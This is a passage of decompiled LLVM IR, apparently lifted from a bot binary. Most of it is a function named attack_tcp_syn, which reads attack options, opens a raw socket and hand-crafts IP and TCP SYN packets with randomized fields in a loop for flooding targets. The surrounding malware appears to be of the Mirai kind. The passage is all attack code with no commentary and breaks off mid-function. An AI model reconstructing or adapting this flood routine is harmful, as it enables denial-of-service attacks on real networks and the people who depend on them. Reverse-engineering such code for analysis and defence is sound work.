  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 26, 28, 27, 33, 29, 30, 31, 32, 37, 34, 35, 36, 38, 40, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 20, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13, 14, 15, 16, 6, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_af30, { 1, 0 }
  uselistorder label %dec_label_pc_af18, { 1, 0 }
  uselistorder label %dec_label_pc_ada0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ad1c, { 1, 0 }
  uselistorder label %dec_label_pc_ad0c, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_syn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_af5c = load i32, i32* @r4, align 4
  %v24_af5c = load i32, i32* @fp, align 4
  %v27_af5c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_af78 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_af7c = load i32, i32* @r5, align 4
  store i32 %v0_af7c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_af78, i32* @sb, align 4
  %v0_af8c = load i32, i32* @r4, align 4
  store i32 %v0_af8c, i32* %r0.global-to-local, align 4
  %v5_af90 = inttoptr i32 %v0_af7c to i32*
  %v6_af90 = call i32 @attack_get_opt_int(i32 %v0_af8c, i32* %v5_af90, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_afa8 = load i32, i32* @r5, align 4
  store i32 %v0_afa8, i32* %r1.global-to-local, align 4
  %v0_afac = load i32, i32* @r4, align 4
  store i32 %v0_afac, i32* %r0.global-to-local, align 4
  %v5_afb0 = trunc i32 %v6_af90 to i8
  %v6_afb4 = inttoptr i32 %v0_afa8 to i32*
  %v7_afb4 = call i32 @attack_get_opt_int(i32 %v0_afac, i32* %v6_afb4, i32 3, i32 65535, i32 %v6_af90)
  %v0_afb8 = load i32, i32* @r5, align 4
  store i32 %v0_afb8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_afc8 = load i32, i32* @r4, align 4
  store i32 %v0_afc8, i32* %r0.global-to-local, align 4
  %v5_afcc = inttoptr i32 %v0_afb8 to i32*
  %v6_afcc = call i32 @attack_get_opt_int(i32 %v0_afc8, i32* %v5_afcc, i32 4, i32 64, i32 %v7_afb4)
  %v1_afd4 = urem i32 %v6_afcc, 256
  %v0_afd8 = load i32, i32* @r5, align 4
  store i32 %v0_afd8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_afe4 = load i32, i32* @r4, align 4
  store i32 %v0_afe4, i32* %r0.global-to-local, align 4
  %v6_afec = inttoptr i32 %v0_afd8 to i32*
  %v7_afec = call i32 @attack_get_opt_int(i32 %v0_afe4, i32* %v6_afec, i32 5, i32 1, i32 %v1_afd4)
  %v1_aff8 = urem i32 %v7_afec, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b004 = load i32, i32* @r5, align 4
  store i32 %v0_b004, i32* %r1.global-to-local, align 4
  %v0_b008 = load i32, i32* @r4, align 4
  store i32 %v0_b008, i32* %r0.global-to-local, align 4
  %v5_b010 = inttoptr i32 %v0_b004 to i32*
  %v6_b010 = call i32 @attack_get_opt_int(i32 %v0_b008, i32* %v5_b010, i32 6, i32 65535, i32 %v1_aff8)
  %v0_b018 = load i32, i32* @r5, align 4
  store i32 %v0_b018, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b010, i32* %fp.global-to-local, align 4
  %v0_b028 = load i32, i32* @r4, align 4
  store i32 %v0_b028, i32* %r0.global-to-local, align 4
  %v5_b02c = inttoptr i32 %v0_b018 to i32*
  %v6_b02c = call i32 @attack_get_opt_int(i32 %v0_b028, i32* %v5_b02c, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_b034 = load i32, i32* @r5, align 4
  store i32 %v0_b034, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_b02c, i32* @r6, align 4
  %v0_b044 = load i32, i32* @r4, align 4
  store i32 %v0_b044, i32* %r0.global-to-local, align 4
  %v5_b048 = inttoptr i32 %v0_b034 to i32*
  %v6_b048 = call i32 @attack_get_opt_int(i32 %v0_b044, i32* %v5_b048, i32 17, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_b04c = load i32, i32* @r5, align 4
  store i32 %v0_b04c, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b05c = load i32, i32* @r4, align 4
  store i32 %v0_b05c, i32* %r0.global-to-local, align 4
  %v5_b060 = inttoptr i32 %v0_b04c to i32*
  %v6_b060 = call i32 @attack_get_opt_int(i32 %v0_b05c, i32* %v5_b060, i32 18, i32 0, i32 %v6_b048)
  %v0_b064 = load i32, i32* @r5, align 4
  store i32 %v0_b064, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b074 = load i32, i32* @r4, align 4
  store i32 %v0_b074, i32* %r0.global-to-local, align 4
  %v5_b078 = inttoptr i32 %v0_b064 to i32*
  %v6_b078 = call i32 @attack_get_opt_int(i32 %v0_b074, i32* %v5_b078, i32 11, i32 0, i32 %v6_b060)
  %v0_b07c = load i32, i32* @r5, align 4
  store i32 %v0_b07c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b08c = load i32, i32* @r4, align 4
  store i32 %v0_b08c, i32* %r0.global-to-local, align 4
  %v5_b090 = inttoptr i32 %v0_b07c to i32*
  %v6_b090 = call i32 @attack_get_opt_int(i32 %v0_b08c, i32* %v5_b090, i32 12, i32 0, i32 %v6_b078)
  %v0_b094 = load i32, i32* @r5, align 4
  store i32 %v0_b094, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0a4 = load i32, i32* @r4, align 4
  store i32 %v0_b0a4, i32* %r0.global-to-local, align 4
  %v5_b0a8 = inttoptr i32 %v0_b094 to i32*
  %v6_b0a8 = call i32 @attack_get_opt_int(i32 %v0_b0a4, i32* %v5_b0a8, i32 13, i32 0, i32 %v6_b090)
  %v0_b0ac = load i32, i32* @r5, align 4
  store i32 %v0_b0ac, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0bc = load i32, i32* @r4, align 4
  store i32 %v0_b0bc, i32* %r0.global-to-local, align 4
  %v5_b0c0 = inttoptr i32 %v0_b0ac to i32*
  %v6_b0c0 = call i32 @attack_get_opt_int(i32 %v0_b0bc, i32* %v5_b0c0, i32 14, i32 0, i32 %v6_b0a8)
  %v0_b0c4 = load i32, i32* @r5, align 4
  store i32 %v0_b0c4, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b0d4 = load i32, i32* @r4, align 4
  store i32 %v0_b0d4, i32* %r0.global-to-local, align 4
  %v5_b0d8 = inttoptr i32 %v0_b0c4 to i32*
  %v6_b0d8 = call i32 @attack_get_opt_int(i32 %v0_b0d4, i32* %v5_b0d8, i32 15, i32 1, i32 %v6_b0c0)
  %v0_b0dc = load i32, i32* @r5, align 4
  store i32 %v0_b0dc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0ec = load i32, i32* @r4, align 4
  store i32 %v0_b0ec, i32* %r0.global-to-local, align 4
  %v5_b0f0 = inttoptr i32 %v0_b0dc to i32*
  %v6_b0f0 = call i32 @attack_get_opt_int(i32 %v0_b0ec, i32* %v5_b0f0, i32 16, i32 0, i32 %v6_b0d8)
  %v2_b0fc = load i32, i32* @global_var_24a4c.59, align 4
  store i32 %v2_b0fc, i32* %r3.global-to-local, align 4
  %v0_b100 = load i32, i32* @r5, align 4
  store i32 %v0_b100, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b108 = load i32, i32* @r4, align 4
  store i32 %v0_b108, i32* %r0.global-to-local, align 4
  %v5_b10c = inttoptr i32 %v0_b100 to i32*
  %v6_b10c = call i32 @attack_get_opt_ip(i32 %v0_b108, i32* %v5_b10c, i32 25, i32 %v2_b0fc, i32 %v6_b0f0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b120 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b120, i32* %r0.global-to-local, align 4
  %v7_b124 = icmp eq i32 %v3_b120, -1
  store i1 %v7_b124, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b120, i32* @sl, align 4
  br i1 %v7_b124, label %dec_label_pc_b5f8, label %dec_label_pc_b130

dec_label_pc_b130:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b138 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b138, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b14c = call i32 @__GI_setsockopt(i32 %v3_b120, i32 0, i32 3, i32 %v6_b138, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b14c, i32* %r0.global-to-local, align 4
  %v7_b150 = icmp eq i32 %v5_b14c, -1
  store i1 %v7_b150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b150, label %dec_label_pc_b5f0, label %dec_label_pc_b158

dec_label_pc_b158:                                ; preds = %dec_label_pc_b130
  %v3_b160 = mul i32 %v7_afb4, 65536
  store i32 %v3_b160, i32* %r0.global-to-local, align 4
  %v0_b164 = load i32, i32* %fp.global-to-local, align 4
  %v3_b164 = mul i32 %v0_b164, 65536
  store i32 %v3_b164, i32* %r4.global-to-local, align 4
  %v0_b168 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_b078, i32* %r2.global-to-local, align 4
  %v3_b174 = urem i32 %v7_afb4, 65536
  store i32 %v3_b174, i32* %r3.global-to-local, align 4
  %v3_b178 = urem i32 %v0_b164, 65536
  %v3_b17c = urem i32 %v0_b168, 65536
  store i32 %v3_b17c, i32* %r1.global-to-local, align 4
  %v0_b180 = load i32, i32* @r7, align 4
  %v2_b180 = icmp eq i32 %v0_b180, 0
  store i1 %v2_b180, i1* %cpsr_z.global-to-local, align 1
  %v1_b190 = urem i32 %v6_b078, 256
  store i32 %v1_b190, i32* @fp, align 4
  br i1 %v2_b180, label %dec_label_pc_b3e4.preheader, label %dec_label_pc_b198

dec_label_pc_b198:                                ; preds = %dec_label_pc_b158
  %tmp52 = mul i32 %v6_b048, 256
  %v3_b1b0 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_afb4, 256
  %v3_b1b4 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v6_b048, 256
  %v4_b1bc = urem i32 %tmp54, 256
  %v5_b1bc = or i32 %v4_b1bc, %v3_b1b0
  store i32 %v5_b1bc, i32* @lr, align 4
  %v1_b1b8 = mul i32 %v7_afb4, 256
  %v4_b1c0 = and i32 %v1_b1b8, 65280
  %v5_b1c0 = or i32 %v4_b1c0, %v3_b1b4
  %tmp55 = mul i32 %v0_b164, 256
  %v3_b1cc = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_b168, 256
  %v3_b1d0 = and i32 %tmp56, 65280
  %v1_b1d4 = urem i32 %v6_b078, 2
  %v1_b1d8 = urem i32 %v6_b090, 2
  %tmp57 = udiv i32 %v0_b164, 256
  %v4_b1dc = urem i32 %tmp57, 256
  %v5_b1dc = or i32 %v4_b1dc, %v3_b1cc
  store i32 %v5_b1dc, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_b168, 256
  %v4_b1e0 = urem i32 %tmp58, 256
  %v5_b1e0 = or i32 %v4_b1e0, %v3_b1d0
  store i32 %v5_b1e0, i32* @r5, align 4
  %v1_b1fc = urem i32 %v6_b0a8, 2
  store i32 %v1_b1fc, i32* %r2.global-to-local, align 4
  %v1_b200 = urem i32 %v6_b0c0, 2
  store i32 %v1_b200, i32* %r3.global-to-local, align 4
  %v1_b204 = urem i32 %v6_b0d8, 2
  store i32 %v1_b204, i32* %r0.global-to-local, align 4
  %v1_b208 = urem i32 %v6_b0f0, 2
  store i32 %v1_b208, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_b1c0, 65536
  %v4_b290 = sdiv i32 %sext, 65536
  %tmp = sub nsw i32 0, %v1_b1d8
  %v4_b2f4 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_b1fc
  %v4_b308 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_b200
  %v4_b320 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_b204
  %v3_b334 = and i32 %tmp64, 2
  %v1_b284 = trunc i32 %v6_afcc to i8
  br label %dec_label_pc_b228

dec_label_pc_b228:                                ; preds = %bb61, %dec_label_pc_b198
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_b230 = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_b230, i32* %r0.global-to-local, align 4
  %v3_b234 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b234, i32* %r2.global-to-local, align 4
  %v1_b238 = load i32, i32* @sb, align 4
  %v2_b238 = load i32, i32* @r4, align 4
  %v5_b238 = mul i32 %v2_b238, 4
  %v6_b238 = add i32 %v5_b238, %v1_b238
  %v7_b238 = inttoptr i32 %v6_b238 to i32*
  store i32 %v2_b230, i32* %v7_b238, align 4
  %v0_b23c = load i32, i32* %r2.global-to-local, align 4
  %v3_b23c = mul i32 %v0_b23c, 32
  store i32 %v3_b23c, i32* %r3.global-to-local, align 4
  %v0_b240 = load i32, i32* @sb, align 4
  %v4_b240 = mul i32 %v0_b23c, 4
  %v5_b240 = add i32 %v0_b240, %v4_b240
  %v6_b240 = inttoptr i32 %v5_b240 to i32*
  %v7_b240 = load i32, i32* %v6_b240, align 4
  store i32 %v7_b240, i32* %r4.global-to-local, align 4
  %v5_b244 = mul i32 %v0_b23c, 24
  store i32 %v5_b244, i32* %r3.global-to-local, align 4
  %v1_b248 = load i32, i32* @r8, align 4
  %v2_b248 = add i32 %v1_b248, %v5_b244
  store i32 %v2_b248, i32* %r0.global-to-local, align 4
  %v1_b24c = inttoptr i32 %v7_b240 to i8*
  %v2_b24c = load i8, i8* %v1_b24c, align 1
  %tmp65 = urem i8 %v2_b24c, 16
  %v1_b250 = zext i8 %tmp65 to i32
  %v1_b254 = or i32 %v1_b250, 64
  store i32 %v1_b254, i32* %r3.global-to-local, align 4
  %v1_b258 = trunc i32 %v1_b254 to i8
  store i8 %v1_b258, i8* %v1_b24c, align 1
  %v0_b25c = load i32, i32* %r4.global-to-local, align 4
  %v1_b25c = inttoptr i32 %v0_b25c to i8*
  %v2_b25c = load i8, i8* %v1_b25c, align 1
  %v1_b260 = and i8 %v2_b25c, -16
  %v1_b264 = or i8 %v1_b260, 5
  store i32 %v1_aff8, i32* %r3.global-to-local, align 4
  store i8 %v1_b264, i8* %v1_b25c, align 1
  %v2_b274 = load i32, i32* %r4.global-to-local, align 4
  %v3_b274 = add i32 %v2_b274, 1
  %v4_b274 = inttoptr i32 %v3_b274 to i8*
  store i8 %v5_afb0, i8* %v4_b274, align 1
  store i32 %v1_afd4, i32* %r2.global-to-local, align 4
  %v0_b27c = load i32, i32* %r3.global-to-local, align 4
  %v2_b27c = icmp eq i32 %v0_b27c, 0
  store i1 %v2_b27c, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_b284 = load i32, i32* %r4.global-to-local, align 4
  %v3_b284 = add i32 %v2_b284, 8
  %v4_b284 = inttoptr i32 %v3_b284 to i8*
  store i8 %v1_b284, i8* %v4_b284, align 1
  %v0_b288 = load i32, i32* %r3.global-to-local, align 4
  %v1_b288 = trunc i32 %v0_b288 to i16
  %v2_b288 = load i32, i32* %r4.global-to-local, align 4
  %v3_b288 = add i32 %v2_b288, 2
  %v4_b288 = inttoptr i32 %v3_b288 to i16*
  store i16 %v1_b288, i16* %v4_b288, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_b290, i32* %r1.global-to-local, align 4
  %v0_b294 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b294, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_b228
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_b228, %bb
  %v2_b298 = load i32, i32* %r4.global-to-local, align 4
  %v3_b298 = add i32 %v2_b298, 9
  %v4_b298 = inttoptr i32 %v3_b298 to i8*
  store i8 6, i8* %v4_b298, align 1
  %v0_b29c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b29c, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_b29c = load i32, i32* %r2.global-to-local, align 4
  %v2_b29c = trunc i32 %v1_b29c to i16
  %v3_b29c = load i32, i32* %r4.global-to-local, align 4
  %v4_b29c = add i32 %v3_b29c, 6
  %v5_b29c = inttoptr i32 %v4_b29c to i16*
  store i16 %v2_b29c, i16* %v5_b29c, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_b10c, i32* %r2.global-to-local, align 4
  %v1_b2a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_b2a4 = add i32 %v1_b2a4, 12
  %v3_b2a4 = inttoptr i32 %v2_b2a4 to i32*
  store i32 %v6_b10c, i32* %v3_b2a4, align 4
  %v0_b2a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_b2a8 = add i32 %v0_b2a8, 16
  %v2_b2a8 = inttoptr i32 %v1_b2a8 to i32*
  %v3_b2a8 = load i32, i32* %v2_b2a8, align 4
  store i32 %v3_b2a8, i32* %r3.global-to-local, align 4
  %v0_b2ac = load i32, i32* %r1.global-to-local, align 4
  %v1_b2ac = trunc i32 %v0_b2ac to i16
  %v2_b2ac = load i32, i32* %r4.global-to-local, align 4
  %v3_b2ac = add i32 %v2_b2ac, 4
  %v4_b2ac = inttoptr i32 %v3_b2ac to i16*
  store i16 %v1_b2ac, i16* %v4_b2ac, align 2
  %v0_b2b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_b2b0 = add i32 %v1_b2b0, 16
  %v3_b2b0 = inttoptr i32 %v2_b2b0 to i32*
  store i32 %v0_b2b0, i32* %v3_b2b0, align 4
  %v0_b2b4 = load i32, i32* @r6, align 4
  %v1_b2b4 = trunc i32 %v0_b2b4 to i16
  %v2_b2b4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b2b4 = add i32 %v2_b2b4, 20
  %v4_b2b4 = inttoptr i32 %v3_b2b4 to i16*
  store i16 %v1_b2b4, i16* %v4_b2b4, align 2
  %v0_b2b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_b2b8 = add i32 %v0_b2b8, 20
  store i32 %v1_b2b8, i32* %r1.global-to-local, align 4
  %v1_b2bc = add i32 %v0_b2b8, 32
  %v2_b2bc = inttoptr i32 %v1_b2bc to i8*
  %v3_b2bc = load i8, i8* %v2_b2bc, align 1
  %v4_b2bc = zext i8 %v3_b2bc to i32
  store i32 %v4_b2bc, i32* %r3.global-to-local, align 4
  %v1_b2c0 = add i32 %v0_b2b8, 33
  %v2_b2c0 = inttoptr i32 %v1_b2c0 to i8*
  %v3_b2c0 = load i8, i8* %v2_b2c0, align 1
  %v4_b2c0 = zext i8 %v3_b2c0 to i32
  store i32 %v1_b1d4, i32* %r0.global-to-local, align 4
  %v1_b2c8 = urem i8 %v3_b2bc, 16
  %v1_b2cc = or i8 %v1_b2c8, -96
  %v1_b2d0 = and i32 %v4_b2c0, 223
  store i32 %v1_b2d0, i32* %r2.global-to-local, align 4
  store i8 %v1_b2cc, i8* %v2_b2bc, align 1
  %v0_b2d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_b2d8 = load i32, i32* %r0.global-to-local, align 4
  %v4_b2d8 = mul i32 %v1_b2d8, 32
  %v5_b2d8 = or i32 %v4_b2d8, %v0_b2d8
  store i32 %v5_b2d8, i32* %r2.global-to-local, align 4
  store i32 %v5_b1bc, i32* %r3.global-to-local, align 4
  %v1_b2e0 = trunc i32 %v5_b2d8 to i8
  %v2_b2e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_b2e0 = add i32 %v2_b2e0, 13
  %v4_b2e0 = inttoptr i32 %v3_b2e0 to i8*
  store i8 %v1_b2e0, i8* %v4_b2e0, align 1
  %v0_b2e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_b2e4 = add i32 %v1_b2e4, 4
  %v3_b2e4 = inttoptr i32 %v2_b2e4 to i32*
  store i32 %v0_b2e4, i32* %v3_b2e4, align 4
  %v0_b2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2e8 = add i32 %v0_b2e8, 13
  %v2_b2e8 = inttoptr i32 %v1_b2e8 to i8*
  %v3_b2e8 = load i8, i8* %v2_b2e8, align 1
  %v4_b2e8 = zext i8 %v3_b2e8 to i32
  store i32 %v1_b1d8, i32* %r0.global-to-local, align 4
  %v1_b2f0 = and i32 %v4_b2e8, 239
  %v5_b2f4 = or i32 %v1_b2f0, %v4_b2f4
  store i32 %v5_b2f4, i32* %r3.global-to-local, align 4
  %v1_b2f8 = trunc i32 %v5_b2f4 to i8
  store i8 %v1_b2f8, i8* %v2_b2e8, align 1
  %v0_b2fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b2fc = add i32 %v0_b2fc, 13
  %v2_b2fc = inttoptr i32 %v1_b2fc to i8*
  %v3_b2fc = load i8, i8* %v2_b2fc, align 1
  %v4_b2fc = zext i8 %v3_b2fc to i32
  store i32 %v1_b1fc, i32* %r3.global-to-local, align 4
  %v1_b304 = and i32 %v4_b2fc, 247
  %v5_b308 = or i32 %v1_b304, %v4_b308
  store i32 %v5_b308, i32* %r2.global-to-local, align 4
  %v0_b30c = load i32, i32* @r5, align 4
  %v1_b30c = trunc i32 %v0_b30c to i16
  %v3_b30c = add i32 %v0_b2fc, 2
  %v4_b30c = inttoptr i32 %v3_b30c to i16*
  store i16 %v1_b30c, i16* %v4_b30c, align 2
  %v0_b310 = load i32, i32* %r2.global-to-local, align 4
  %v1_b310 = trunc i32 %v0_b310 to i8
  %v2_b310 = load i32, i32* %r1.global-to-local, align 4
  %v3_b310 = add i32 %v2_b310, 13
  %v4_b310 = inttoptr i32 %v3_b310 to i8*
  store i8 %v1_b310, i8* %v4_b310, align 1
  %v0_b314 = load i32, i32* %r1.global-to-local, align 4
  %v1_b314 = add i32 %v0_b314, 13
  %v2_b314 = inttoptr i32 %v1_b314 to i8*
  %v3_b314 = load i8, i8* %v2_b314, align 1
  %v4_b314 = zext i8 %v3_b314 to i32
  store i32 %v1_b200, i32* %r0.global-to-local, align 4
  %v1_b31c = and i32 %v4_b314, 251
  %v5_b320 = or i32 %v1_b31c, %v4_b320
  store i32 %v5_b320, i32* %r3.global-to-local, align 4
  %v1_b324 = trunc i32 %v5_b320 to i8
  store i8 %v1_b324, i8* %v2_b314, align 1
  %v0_b328 = load i32, i32* %r1.global-to-local, align 4
  %v1_b328 = add i32 %v0_b328, 13
  %v2_b328 = inttoptr i32 %v1_b328 to i8*
  %v3_b328 = load i8, i8* %v2_b328, align 1
  %v4_b328 = zext i8 %v3_b328 to i32
  store i32 %v1_b204, i32* %r3.global-to-local, align 4
  %v1_b330 = and i32 %v4_b328, 253
  %v4_b334 = or i32 %v1_b330, %v3_b334
  store i32 %v4_b334, i32* %r2.global-to-local, align 4
  %v1_b338 = trunc i32 %v4_b334 to i8
  store i8 %v1_b338, i8* %v2_b328, align 1
  %v0_b33c = load i32, i32* %r1.global-to-local, align 4
  %v1_b33c = add i32 %v0_b33c, 13
  %v2_b33c = inttoptr i32 %v1_b33c to i8*
  %v3_b33c = load i8, i8* %v2_b33c, align 1
  %v4_b33c = zext i8 %v3_b33c to i32
  store i32 %v1_b208, i32* %r0.global-to-local, align 4
  %v1_b344 = and i32 %v4_b33c, 254
  %v2_b348 = or i32 %v1_b344, %v1_b208
  store i32 %v2_b348, i32* %r3.global-to-local, align 4
  %v1_b34c = trunc i32 %v2_b348 to i8
  store i8 %v1_b34c, i8* %v2_b33c, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_b358 = load i32, i32* %r4.global-to-local, align 4
  %v3_b358 = add i32 %v2_b358, 40
  %v4_b358 = inttoptr i32 %v3_b358 to i8*
  store i8 2, i8* %v4_b358, align 1
  %v0_b35c = load i32, i32* %r2.global-to-local, align 4
  %v1_b35c = trunc i32 %v0_b35c to i8
  %v2_b35c = load i32, i32* %r4.global-to-local, align 4
  %v3_b35c = add i32 %v2_b35c, 41
  %v4_b35c = inttoptr i32 %v3_b35c to i8*
  store i8 %v1_b35c, i8* %v4_b35c, align 1
  %v0_b360 = call i32 @rand_next()
  %v1_b364 = urem i32 %v0_b360, 16
  %v1_b368 = or i32 %v1_b364, 1392
  %tmp66 = mul nuw nsw i32 %v1_b368, 256
  %v3_b374 = add nuw nsw i32 %tmp66, 2048
  %v5_b37c = or i32 %v3_b374, 5
  %v1_b380 = trunc i32 %v5_b37c to i16
  %v2_b380 = load i32, i32* %r4.global-to-local, align 4
  %v3_b380 = add i32 %v2_b380, 42
  %v4_b380 = inttoptr i32 %v3_b380 to i16*
  store i16 %v1_b380, i16* %v4_b380, align 2
  %v2_b388 = load i32, i32* %r4.global-to-local, align 4
  %v3_b388 = add i32 %v2_b388, 44
  %v4_b388 = inttoptr i32 %v3_b388 to i8*
  store i8 4, i8* %v4_b388, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_b398 = load i32, i32* %r4.global-to-local, align 4
  %v3_b398 = add i32 %v2_b398, 46
  %v4_b398 = inttoptr i32 %v3_b398 to i8*
  store i8 8, i8* %v4_b398, align 1
  %v0_b39c = load i32, i32* %r2.global-to-local, align 4
  %v1_b39c = trunc i32 %v0_b39c to i8
  %v2_b39c = load i32, i32* %r4.global-to-local, align 4
  %v3_b39c = add i32 %v2_b39c, 47
  %v4_b39c = inttoptr i32 %v3_b39c to i8*
  store i8 %v1_b39c, i8* %v4_b39c, align 1
  %v0_b3a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_b3a0 = trunc i32 %v0_b3a0 to i8
  %v2_b3a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3a0 = add i32 %v2_b3a0, 45
  %v4_b3a0 = inttoptr i32 %v3_b3a0 to i8*
  store i8 %v1_b3a0, i8* %v4_b3a0, align 1
  %v0_b3a4 = call i32 @rand_next()
  store i32 %v0_b3a4, i32* %r0.global-to-local, align 4
  %v2_b3ac = load i32, i32* %r4.global-to-local, align 4
  %v3_b3ac = add i32 %v2_b3ac, 59
  %v4_b3ac = inttoptr i32 %v3_b3ac to i8*
  store i8 6, i8* %v4_b3ac, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_b3bc = load i32, i32* %r4.global-to-local, align 4
  %v2_b3bc = add i32 %v1_b3bc, 48
  %v3_b3bc = inttoptr i32 %v2_b3bc to i32*
  store i32 %v0_b3a4, i32* %v3_b3bc, align 4
  %v0_b3c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b3c0 = load i32, i32* %r4.global-to-local, align 4
